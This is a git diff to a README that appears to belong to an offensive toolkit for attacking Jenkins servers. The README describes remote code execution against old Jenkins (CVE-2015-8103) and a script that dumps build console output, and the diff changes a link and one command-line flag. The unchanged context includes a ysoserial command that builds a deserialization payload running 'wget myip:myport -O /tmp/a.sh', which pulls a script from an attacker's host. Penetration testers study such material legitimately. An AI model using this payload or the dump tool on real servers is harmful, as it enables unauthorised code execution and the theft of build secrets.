@@ -10,8 +10,7 @@ RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
 Use ysoserial to generate a payload:
 https://github.com/frohoff/ysoserial
 
-Then RCE using this script [or the one joined](./rce/pwn_jenkins.py):
-https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py
+Then RCE using [this script](./rce/pwn_jenkins.py):
 
 ```bash
 java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
@@ -24,7 +23,7 @@ Use [this script](./dump_builds/jenkins_dump_builds.py) to dump build console ou
 
 ```
 usage: jenkins_dump_builds.py [-h] [-u USER] [-p PASSWORD] [-o OUTPUT_DIR]
-                              [-d] [-f] [-r]
+                              [-d] [-l] [-r]
                               url [url ...]
 
 Dump all available info from Jenkins
@@ -38,7 +37,7 @@ optional arguments:
   -p PASSWORD, --password PASSWORD
   -o OUTPUT_DIR, --output-dir OUTPUT_DIR
   -d, --downgrade_ssl   Downgrade SSL to use RSA
-  -f, --full            Dump all available builds
+  -l, --last            Dump only the last build of each job
   -r, --recover_from_failure
                         Recover from server failure, skip all existing
                         directories
